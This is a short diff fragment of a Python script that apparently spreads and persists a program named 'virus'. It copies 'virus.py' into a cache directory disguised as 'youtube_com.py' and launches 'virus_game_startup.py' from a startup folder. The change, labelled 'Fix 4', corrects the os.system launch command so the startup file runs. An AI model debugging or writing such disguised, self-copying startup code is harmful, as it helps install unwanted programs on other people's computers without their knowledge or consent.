@@ -48,4 +48,4 @@ os.system(f"copy virus.py {os.path.join(target_cache_dir, 'youtube_com.py')}")
 print("Running virus_game_startup.py...")
 # --- Fix 4: Correctly build the path to run the file ---
 # The path must be fully correct, which the new 'startup_folder' ensures.
-os.system(f"{PYTHON_COMMAND} '{os.path.join(startup_folder, 'virus_game_startup.py')}'")
+os.system(f"{PYTHON_COMMAND} {os.path.join(startup_folder, 'virus_game_startup.py')}")
